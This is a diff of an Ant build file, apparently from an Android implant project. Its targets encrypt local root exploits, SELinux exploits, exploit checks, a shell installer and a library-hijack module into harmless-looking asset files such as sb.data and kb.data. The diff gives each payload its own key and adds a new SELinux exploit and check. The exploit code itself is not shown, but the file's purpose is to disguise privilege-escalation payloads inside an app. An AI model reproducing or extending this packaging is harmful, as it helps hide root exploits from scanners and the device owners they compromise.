@@ -105,34 +105,38 @@
 
 	<target name="encrypt-exploit">
 		<delete file="assets/sb.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/suidext" outputFile="assets/sb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}s" inputFile="preprocess/suidext" outputFile="assets/sb.data" />
 		<delete file="assets/jb.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_suidext" outputFile="assets/jb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}j" inputFile="preprocess/selinux_suidext" outputFile="assets/jb.data" />
 		<delete file="assets/hb.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/expl_check" outputFile="assets/hb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}h" inputFile="preprocess/expl_check" outputFile="assets/hb.data" />
 		<delete file="assets/db.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_check" outputFile="assets/db.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}d" inputFile="preprocess/selinux_check" outputFile="assets/db.data" />
 		<delete file="assets/lb.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/local_exploit" outputFile="assets/lb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}l" inputFile="preprocess/local_exploit" outputFile="assets/lb.data" />
 		<delete file="assets/gb.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/selinux_exploit" outputFile="assets/gb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}g" inputFile="preprocess/selinux_exploit" outputFile="assets/gb.data" />
+        <delete file="assets/nb.data" />
+        <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}n" inputFile="preprocess/selinux4_check" outputFile="assets/nb.data" />
+        <delete file="assets/ob.data" />
+        <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}o" inputFile="preprocess/selinux4_exploit" outputFile="assets/ob.data" />
 		<delete file="assets/kb.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/shell_installer.sh" outputFile="assets/kb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}k" inputFile="preprocess/shell_installer.sh" outputFile="assets/kb.data" />
 	</target>
 
 	<target name="encrypt-hijacklibrary">
 		<delete file="assets/ib.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/libt.so" outputFile="assets/ib.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}i" inputFile="preprocess/libt.so" outputFile="assets/ib.data" />
 		<delete file="assets/mb.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/hijack" outputFile="assets/mb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}m" inputFile="preprocess/hijack" outputFile="assets/mb.data" />
 
 	</target>
 
 	<target name="encrypt-hijacklibrary-debug">
 		<delete file="assets/ib.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/libt_debug.so" outputFile="assets/ib.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}i" inputFile="preprocess/libt_debug.so" outputFile="assets/ib.data" />
 		<delete file="assets/mb.data" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/hijack" outputFile="assets/mb.data" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}m" inputFile="preprocess/hijack" outputFile="assets/mb.data" />
 	</target>
 
 
